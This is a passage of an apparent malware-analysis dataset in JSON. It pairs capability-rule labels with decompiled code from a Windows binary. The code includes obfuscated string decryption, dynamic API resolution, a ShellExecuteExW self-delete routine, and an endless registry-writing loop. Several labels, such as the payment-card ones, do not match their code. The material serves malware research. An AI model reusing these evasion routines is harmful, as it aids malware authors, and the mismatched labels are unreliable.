(*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n            var_18h = 0;\n            *puVar8 = 0;\n            puVar8[1] = 0;\n            puVar8[2] = 0;\n            puVar8[3] = 0;\n            puVar8[4] = 0;\n            var_1ch = &var_38h - puVar8;\n            var_14h = puVar8;\n            do {\n                iVar11 = var_18h;\n                pcVar1 = var_18h + puVar8;\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_24h + iVar11 % 6);\n                uVar3 = pcVar1[var_1ch];\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar7 = var_4h;\n                var_18h = var_18h + 1;\n                *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n            } while (var_18h < 0x13);\n            *0x427b78 = fcn.0040f0a7(puVar8);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x427b78 == 0) {\n                uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n                (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar9);\n                goto code_r0x0040ed52;\n            }\n            var_50h = 0x200d1c;\n            var_4ch._0_1_ = 5;\n            stack0xffffffb1 = 0x1c2c3614;\n            var_47h = 0x203a1f0b;\n            var_43h = 0x1c0d1029;\n            var_3fh = 0x7514291c;\n            var_2ch._0_1_ = 0x46;\n            var_2ch._1_1_ = 0x7a;\n            var_2ch._2_2_ = 0x6e75;\n            var_28h._0_2_ = 0x7568;\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n            puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n            var_18h = 0;\n            *puVar8 = 0;\n            puVar8[1] = 0;\n            puVar8[2] = 0;\n            puVar8[3] = 0;\n            puVar8[4] = 0;\n            *(puVar8 + 5) = 0;\n            var_24h = &var_50h - puVar8;\n            var_1ch = puVar8;\n            do {\n                iVar11 = var_18h;\n                pcVar1 = var_18h + puVar8;\n                cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_2ch + iVar11 % 6);\n                uVar3 = pcVar1[var_24h];\n                cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_18h = var_18h + 1;\n                *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n            } while (var_18h < 0x15);\n            *0x427b80 = fcn.0040f0a7(puVar8);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (*0x427b80 != 0) {\n                uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                pcVar12 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n                uVar7 = (*pcVar10)(0, var_14h);\n                (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n                uVar7 = (*pcVar10)(0, var_10h);\n                (*pcVar12)(uVar7);\n                uVar7 = (*pcVar10)(0, var_8h);\n                (*pcVar12)(uVar7);\n                uVar7 = (*pcVar10)(0, var_4h);\n                (*pcVar12)(uVar7);\n                goto code_r0x0040ef58;\n            }\n            uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n            pcVar12 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n            uVar7 = (*pcVar10)(0, var_14h);\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n            uVar7 = (*pcVar10)(0, var_10h);\n        }\n        (*pcVar12)(uVar7);\n        uVar9 = (*pcVar10)(0, var_8h);\n    }\n    (*pcVar12)(uVar9);\n    uVar7 = (*pcVar10)(0, var_4h);\n    (*pcVar12)(uVar7);\ncode_r0x0040ef5d:\n    *0x427b84 = *0x427b80 >> 0x20;\n    *0x427b7c = *0x427b78 >> 0x20;\n    *0x427b74 = *0x427b70 >> 0x20;\n    *0x427b6c = *0x427b68 >> 0x20;\n    return var_ch;\n}\n",
        "token_count": 3104
    },
    "0040f228": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040f228(uint param_1, uint param_2)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint *puVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    code *pcVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint *lpLibFileName;\n    int32_t var_8h;\n    \n    var_34h = 0x49286d2e;\n    var_30h = 0x6d2f7152;\n    var_2ch._0_2_ = 0x4958;\n    var_20h = 0x49586d41;\n    var_1ch._0_2_ = 0x7137;\n    var_18h = param_1;\n    var_14h = param_2;\n    fcn.0040f710(param_1);\n    iVar11 = 0;\n    lpLibFileName = &var_34h - var_24h;\n    do {\n        pcVar1 = var_24h + iVar11;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_20h + iVar11 % 6);\n        uVar3 = pcVar1[lpLibFileName];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar11 = iVar11 + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (iVar11 < 10);\n    var_38h = 0x34211d39;\n    var_34h = 0x7b587e24;\n    var_30h = 0x4d041400;\n    var_20h = 0x7864556a;\n    var_1ch._0_2_ = 0x4d68;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    lpLibFileName = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n    var_8h = 0;\n    *lpLibFileName = 0;\n    lpLibFileName[1] = 0;\n    lpLibFileName[2] = 0;\n    *(lpLibFileName + 3) = 0;\n    pcVar9 = _sym.imp.KERNEL32.dll_GetLastError;\n    var_10h = &var_38h - lpLibFileName;\n    do {\n        iVar11 = var_8h;\n        pcVar1 = var_8h + lpLibFileName;\n        cVar5 = (*pcVar9)();\n        uVar2 = *(&var_20h + iVar11 % 6);\n        uVar3 = pcVar1[var_10h];\n        cVar6 = (*pcVar9)();\n        var_8h = var_8h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_8h < 0xc);\n    var_38h = 0x24133f18;\n    var_34h = 0x132f0e21;\n    var_30h = 0x323f382b;\n    var_2ch._0_2_ = 0x4821;\n    var_20h = 0x4876574b;\n    var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x4d);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    puVar8 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n    var_8h = 0;\n    *puVar8 = 0;\n    puVar8[1] = 0;\n    puVar8[2] = 0;\n    *(puVar8 + 3) = 0;\n    *(puVar8 + 0xe) = 0;\n    var_10h = &var_38h - puVar8;\n    do {\n        iVar11 = var_8h;\n        pcVar1 = var_8h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_20h + iVar11 % 5);\n        uVar3 = pcVar1[var_10h];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puVar4 = lpLibFileName;\n        var_8h = var_8h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_8h < 0xe);\n    uVar7 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, puVar8);\n    pcVar9 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar7);\n    uVar10 = (*pcVar9)(0, var_24h, var_18h, var_14h, 0, 0);\n    if (0x20 < uVar10) {\n        uVar10 = 0;\n    }\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    pcVar9 = _sym.imp.ntdll.dll_RtlFreeHeap;\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n    (*pcVar9)(uVar7);\n    fcn.0040f6eb();\n    return uVar10;\n}\n",
        "token_count": 1381
    },
    "0041039d": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041039d(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    char cVar7;\n    char cVar8;\n    uint uVar9;\n    uint32_t uVar10;\n    uint *puVar11;\n    uint uVar12;\n    int32_t iVar13;\n    uint extraout_ECX;\n    uint *puVar14;\n    uint lpString1;\n    uint lpBuffer;\n    uint lpFilename;\n    uint pExecInfo;\n    uint var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint *var_ach;\n    uint *var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint hProcess;\n    int32_t var_80h;\n    uint *lpName;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_28h;\n    uint *var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x511d6772;\n    var_14h = 0x67624e78;\n    var_10h = 0x4e705102;\n    var_ch = 0x51526772;\n    var_8h = 0x51526731;\n    var_4h._0_2_ = 0x4e35;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    lpName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    uVar10 = 0;\n    do {\n        *(lpName + uVar10) = *(lpName + uVar10) + -3;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x21);\n    puVar11 = lpName;\n    for (iVar13 = 8; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar11 = 0;\n        puVar11 = puVar11 + 1;\n    }\n    *puVar11 = 0;\n    iVar13 = 0;\n    var_28h = &var_18h - lpName;\n    do {\n        pcVar1 = lpName + iVar13;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar13 % 6);\n        uVar3 = pcVar1[var_28h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar13 = iVar13 + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (iVar13 < 0x10);\n    iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(0, &lpFilename, 0x104);\n    if (iVar13 != 0) {\n        iVar13 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableW)(lpName, &lpBuffer, 0x104);\n        if (iVar13 != 0) {\n            var_78h = 0x69524a44;\n            var_74h = 0x4a1b4b11;\n            var_70h = 0x4b5f6958;\n            var_6ch = 0x69114a0c;\n            var_68h = 0x4a044b5d;\n            var_64h = 0x4b506952;\n            var_60h = 0x69594a07;\n            var_5ch = 0x4a184b5e;\n            var_58h = 0x4b116945;\n            var_54h = 0x695f4a46;\n            var_50h = 0x4a5f4b11;\n            var_4ch = 0x4b176911;\n            var_48h = 0x69554a4b;\n            var_44h = 0x4a074b54;\n            var_40h = 0x4b1e6911;\n            var_3ch = 0x69114a2d;\n            var_38h = 0x4a3a4b1e;\n            var_34h = 0x4b136911;\n            var_30h._0_2_ = 0x4a6b;\n            var_8h = 0x69314a6b;\n            var_4h._0_2_ = 0x4b31;\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x95);\n            iVar13 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar9);\n            uVar10 = 0;\n            do {\n                *(iVar13 + uVar10) = *(iVar13 + uVar10) * 'H';\n                uVar10 = uVar10 + 1;\n            } while (uVar10 < 0x95);\n            var_28h = iVar13;\n            sub.ntdll.dll_memset(iVar13, 0, 0x95);\n            var_1ch = 0;\n            var_24h = &var_78h - iVar13;\n            do {\n                iVar6 = var_1ch;\n                pcVar1 = iVar13 + var_1ch;\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_8h + iVar6 % 6);\n                uVar3 = pcVar1[var_24h];\n                cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_1ch = var_1ch + 1;\n                *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n            } while (var_1ch < 0x4a);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(&lpString1, iVar13);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, &lpFilename);\n            var_18h = 0x36134b6b;\n            var_14h = 0x336b4955;\n            var_10h = 0x4b3c6b58;\n            var_ch = 0x496b365f;\n            var_8h = 0x36334b49;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x6b);\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n            puVar11 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar9);\n            uVar10 = 0;\n            do {\n                *(puVar11 + uVar10) = *(puVar11 + uVar10) ^ 0x1c;\n                uVar10 = uVar10 + 1;\n            } while (uVar10 < 0x21);\n            puVar14 = puVar11;\n            for (iVar13 = 8; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar14 = 0;\n                puVar14 = puVar14 + 1;\n            }\n            var_1ch = 0;\n            *puVar14 = 0;\n            var_80h = &var_18h - puVar11;\n            var_24h = puVar11;\n            do {\n                iVar13 = var_1ch;\n                pcVar1 = puVar11 + var_1ch;\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_8h + iVar13 % 5);\n                uVar3 = pcVar1[var_80h];\n                cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                var_1ch = var_1ch + 1;\n                *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n            } while (var_1ch < 0x10);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(&lpString1, puVar11);\n            var_14h = 0x49286d2e;\n            var_10h = 0x6d2f7152;\n            var_ch = CONCAT22(var_ch._2_2_, 0x4958);\n            var_8h = 0x49586d41;\n            var_4h._0_2_ = 0x7137;\n            fcn.0040f710(extraout_ECX);\n            iVar13 = 0;\n            var_80h = &var_14h - var_1ch;\n            do {\n                pcVar1 = var_1ch + iVar13;\n                cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                uVar2 = *(&var_8h + iVar13 % 6);\n                uVar3 = pcVar1[var_80h];\n                cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                iVar13 = iVar13 + 1;\n                *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetCurrentProcess;\n            } while (iVar13 < 10);\n            var_b0h = var_1ch;\n            var_ach = &lpBuffer;\n            pExecInfo = 0x3c;\n            var_a8h = &lpString1;\n            var_b4h = 0;\n            var_a4h = 0;\n            var_a0h = 0;\n            var_b8h = 0x40;\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x100);\n            pcVar4 = _sym.imp.KERNEL32.dll_SetPriorityClass;\n            (*_sym.imp.KERNEL32.dll_SetPriorityClass)(uVar9);\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(0xf);\n            (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar9);\n            (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n            iVar13 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n            puVar11 = var_24h;\n            if (iVar13 != 0) {\n                (*pcVar4)(hProcess, 0x40);\n                uVar9 = 1;\n                (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)(hProcess, 1);\n                (*_sym.imp.SHELL32.dll_SHChangeNotify)(4, 5, &lpFilename, 0);\n                fcn.0040f6eb();\n                uVar10 = 0;\n                do {\n                    *(puVar11 + uVar10) = *(puVar11 + uVar10) + '\\x13';\n                    uVar10 = uVar10 + 1;\n                } while (uVar10 < 0x21);\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar11);\n                pcVar5 = _sym.imp.ntdll.dll_RtlFreeHeap;\n                (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar12);\n                uVar10 = 0;\n                do {\n                    *(var_28h + uVar10) = *(var_28h + uVar10) + -0x67;\n                    uVar10 = uVar10 + 1;\n                } while (uVar10 < 0x95);\n                uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_28h);\n                (*pcVar5)(uVar12);\n                goto code_r0x00410803;\n            }\n            uVar9 = (*pcVar5)(0x20);\n            (*pcVar4)(uVar9);\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(0);\n            (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar9);\n            fcn.0040f6eb();\n            uVar10 = 0;\n            do {\n                *(puVar11 + uVar10) = *(puVar11 + uVar10) + '\\x13';\n                uVar10 = uVar10 + 1;\n            } while (uVar10 < 0x21);\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar11);\n            pcVar5 = _sym.imp.ntdll.dll_RtlFreeHeap;\n            (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar9);\n            uVar10 = 0;\n            do {\n                *(var_28h + uVar10) = *(var_28h + uVar10) + -0x67;\n                uVar10 = uVar10 + 1;\n            } while (uVar10 < 0x95);\n            uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_28h);\n            (*pcVar5)(uVar9);\n        }\n    }\n    uVar9 = 0;\ncode_r0x00410803:\n    uVar10 = 0;\n    do {\n        *(lpName + uVar10) = *(lpName + uVar10) + -0x22;\n        uVar10 = uVar10 + 1;\n    } while (uVar10 < 0x21);\n    uVar12 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpName);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar12);\n    return uVar9;\n}\n",
        "token_count": 3244
    },
    "0040a5a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040a5a3(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x4279e4 = 1;\n            *0x425e2c = 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0041082a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0041082a(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint *lpLibFileName;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x142e0d28;\n    var_20h = 0x6a5a203e;\n    var_1ch._0_1_ = 0x75;\n    var_18h = 0x75586949;\n    var_14h._0_1_ = 0x4e;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    puVar8 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n    var_4h = 0;\n    *puVar8 = 0;\n    puVar8[1] = 0;\n    *(puVar8 + 2) = 0;\n    var_ch = &var_24h - puVar8;\n    lpLibFileName = puVar8;\n    do {\n        iVar4 = var_4h;\n        pcVar1 = var_4h + puVar8;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_18h + iVar4 % 5);\n        uVar3 = pcVar1[var_ch];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_4h < 9);\n    if (*0x427bb0 == NULL) {\n        var_38h = 0x31243f1f;\n        var_34h = 0x22002152;\n        var_30h = 0x2f38542b;\n        var_2ch = 0x7f072b38;\n        var_28h._0_2_ = 0x5770;\n        var_20h = 0x4557464c;\n        var_1ch._0_1_ = 0x37;\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        puVar9 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n        var_4h = 0;\n        *puVar9 = 0;\n        puVar9[1] = 0;\n        puVar9[2] = 0;\n        puVar9[3] = 0;\n        *(puVar9 + 4) = 0;\n        *(puVar9 + 0x12) = 0;\n        var_ch = &var_38h - puVar9;\n        var_18h = puVar9;\n        do {\n            iVar4 = var_4h;\n            pcVar1 = var_4h + puVar9;\n            cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar2 = *(&var_20h + iVar4 % 5);\n            uVar3 = pcVar1[var_ch];\n            cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            puVar8 = lpLibFileName;\n            var_4h = var_4h + 1;\n            *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        } while (var_4h < 0x12);\n        uVar7 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, puVar9);\n        *0x427bb0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar7);\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h);\n        (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n    }\n    (**0x427bb0)(&var_8h, 4);\n    if (var_8h < 0) {\n        var_8h = -var_8h;\n    }\n    iVar4 = var_8h;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar8);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar7);\n    return iVar4;\n}\n",
        "token_count": 1114
    },
    "00402ecf": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402ecf(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint var_168h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_58h = 0x47355603;\n    var_54h = 0x5c221b07;\n    var_50h = 0x19197e0f;\n    var_4ch = 0x5c205622;\n    puVar8 = &var_168h;\n    for (iVar10 = 0x104; iVar10 != 0; iVar10 = iVar10 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_60h = 0;\n    var_48h = 0x6e0c0e16;\n    var_44h = 0x15145d3a;\n    var_40h = 0x700f4a27;\n    var_3ch = 0x5c220805;\n    var_38h = 0x1f26473d;\n    var_34h = 0x5c3a4a22;\n    var_30h = 0x5719261e;\n    var_2ch = 0x14025627;\n    var_28h = 0x60734d35;\n    var_24h = 0x50240e15;\n    var_20h = 0x2603543d;\n    var_1ch = 0x563d560a;\n    var_18h = 0x5d752603;\n    var_14h._0_2_ = 0x330f;\n    var_10h = 0x33533950;\n    var_ch._0_2_ = 0x7a70;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x47);\n    iVar10 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar7);\n    var_64h = iVar10;\n    sub.ntdll.dll_memset(iVar10, 0, 0x47);\n    var_8h = 0;\n    var_5ch = &var_58h - iVar10;\n    do {\n        iVar4 = var_8h;\n        pcVar1 = var_8h + iVar10;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_10h + iVar4 % 6);\n        uVar3 = pcVar1[var_5ch];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_8h = var_8h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_8h < 0x46);\n    var_8h = 0x717c0757;\n    var_4h._0_1_ = 0x67;\n    var_10h = 0x414c3265;\n    var_ch._0_2_ = 0x3367;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    puVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    iVar10 = 0;\n    *puVar8 = 0;\n    *(puVar8 + 1) = 0;\n    var_5ch = &var_8h - puVar8;\n    do {\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_10h + iVar10 % 6);\n        uVar3 = *(puVar8 + var_5ch + iVar10);\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        iVar4 = var_64h;\n        *(iVar10 + puVar8) = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 5);\n    do {\n        iVar10 = 0;\n        do {\n            var_8h = 0;\n            (*_sym.imp.USER32.dll_wsprintfA)(&var_168h, iVar4, iVar10);\n            iVar9 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &var_168h, &var_8h);\n            if (iVar9 == 0) {\n                var_60h = 3;\n                (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(var_8h, puVar8, 0, 4, &var_60h, 4);\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_8h);\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 5);\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    } while( true );\n}\n",
        "token_count": 1355
    },
    "00408295": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408295(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint lpBuffer;\n    int32_t var_ch;\n    uint32_t lpNumberOfBytesRead;\n    uint var_4h;\n    \n    uVar7 = 0;\n    iVar5 = 0;\n    var_4h = param_1;\n    do {\n        *0x427640 = uVar7;\n        var_ch = (*_sym.imp.KERNEL32.dll_CreateFileW)(var_4h, 0x80000000, 3, uVar7, 3, uVar7, uVar7);\n        if (var_ch != 0) {\n            while (iVar2 = var_ch, \n                  iVar3 = (*_sym.imp.KERNEL32.dll_ReadFile)(var_ch, &lpBuffer, 0x200, &lpNumberOfBytesRead, uVar7), \n                  iVar3 != 0) {\n                if (lpNumberOfBytesRead == 0) {\n                    uVar7 = 0;\n                    break;\n                }\n                puVar6 = &lpBuffer;\n                uVar7 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                    *0x427640 = *0x427640 >> 8 ^ *((uVar1 ^ *0x427640 & 0xff) * 4 + 0x415720) ^ 0xd202ef8d;\n                    uVar7 = 